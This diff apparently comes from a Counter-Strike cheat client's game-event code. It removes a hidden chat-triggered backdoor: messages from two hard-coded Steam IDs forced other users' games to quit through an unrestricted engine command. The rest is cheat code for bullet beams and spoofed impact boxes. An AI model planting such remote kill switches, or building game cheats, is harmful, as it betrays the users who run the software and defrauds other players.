@@ -57,7 +57,6 @@ void C_GameEvent::Register() {
 	ADD_GAMEEVENT(bomb_beep);
 	ADD_GAMEEVENT(bomb_defused);
 	ADD_GAMEEVENT(bomb_exploded);
-	ADD_GAMEEVENT(player_say);
 }
 
 void C_GameEvent::Shutdown() {
@@ -104,45 +103,11 @@ void C_GameEvent::FireGameEvent(IGameEvent* pEvent) {
 
 	static auto sv_showimpacts_time = Interfaces::m_pCvar->FindVar(XorStr("sv_showimpacts_time"));
 
-	bool m_bInPlayerSay = false;
-
+	// Force constexpr hash computing 
 	switch (event_hash) {
-	case hash_32_fnv1a_const("player_say"):
-	{
-		m_bInPlayerSay = true;
-
-		std::string message = pEvent->GetString("text");
-		player_info_t player_info;
-
-		// ILoggerEvent::Get()->PushEvent("ooga booga", FloatColor(255, 255, 255), true, XorStr(""));
-		// Interfaces::m_pEngine->ClientCmd_Unrestricted(XorStr("say "));
-
-		if (!Interfaces::m_pEngine->GetPlayerInfo(Interfaces::m_pEngine->GetPlayerForUserID(pEvent->GetInt(XorStr("userid"))), &player_info))
-			return;
-
-		if (player_info.steamID64 == 76561199062307601 || player_info.steamID64 == 76561199178252981) {
-			//                 synth                  ||                    or skylet
-			if (message == ".crashsynth") {
-				if (player_info.steamID64 == 76561199062307601) {
-					Interfaces::m_pEngine->ClientCmd_Unrestricted(XorStr("quit"));
-				}
-			}
-			if (message == ".crashprompto") {
-				if (player_info.steamID64 == 76561199178252981) {
-					Interfaces::m_pEngine->ClientCmd_Unrestricted(XorStr("quit"));
-				}
-			}
-			if (message == ".crashusers") {
-				if (player_info.steamID64 == 76561199178252981 || player_info.steamID64 == 76561199062307601)
-					return;
-
-				Interfaces::m_pEngine->ClientCmd_Unrestricted(XorStr("quit"));
-			}
-		}
-	}
 	case hash_32_fnv1a_const("game_newmap"):
 	{
-		Engine::LagCompensation::Get()->ClearLagData(); 
+		Engine::LagCompensation::Get()->ClearLagData();
 		g_Vars.globals.m_bNewMap = true;
 		g_Vars.globals.BobmActivityIndex = -1;
 	}
@@ -153,13 +118,9 @@ void C_GameEvent::FireGameEvent(IGameEvent* pEvent) {
 		bool bCameFromLocal = LocalPlayer && ent && LocalPlayer == ent;
 		bool bCameFromEnemy = LocalPlayer && ent && ent->m_iTeamNum() != LocalPlayer->m_iTeamNum();
 		if (LocalPlayer && !LocalPlayer->IsDead()) {
-			
+
 			float x = pEvent->GetFloat(XorStr("x")), y = pEvent->GetFloat(XorStr("y")), z = pEvent->GetFloat(XorStr("z"));
 			if (g_Vars.esp.beam_enabled) {
-
-				if (m_bInPlayerSay)
-					return;
-
 				if (bCameFromLocal) {
 					IBulletBeamTracer::Get()->PushBeamInfo({ Interfaces::m_pGlobalVars->curtime, LocalPlayer->GetEyePosition(), Vector(x, y, z), Color(), ent->EntIndex(), LocalPlayer->m_nTickBase() });
 				}
@@ -170,17 +131,12 @@ void C_GameEvent::FireGameEvent(IGameEvent* pEvent) {
 			}
 
 			if (bCameFromLocal) {
-
-				if (m_bInPlayerSay)
-					return;
-
 				int color[4] = { g_Vars.esp.server_impacts.r * 255, g_Vars.esp.server_impacts.g * 255, g_Vars.esp.server_impacts.b * 255, g_Vars.esp.server_impacts.a * 255 };
 
 				if (g_Vars.misc.server_impacts_spoof) // draw server impact
 					Interfaces::m_pDebugOverlay->AddBoxOverlay(Vector(x, y, z), Vector(-2, -2, -2), Vector(2, 2, 2), QAngle(0, 0, 0), color[0], color[1], color[2], color[3],
 						sv_showimpacts_time->GetFloat());
 			}
-
 		}
 
 		break;
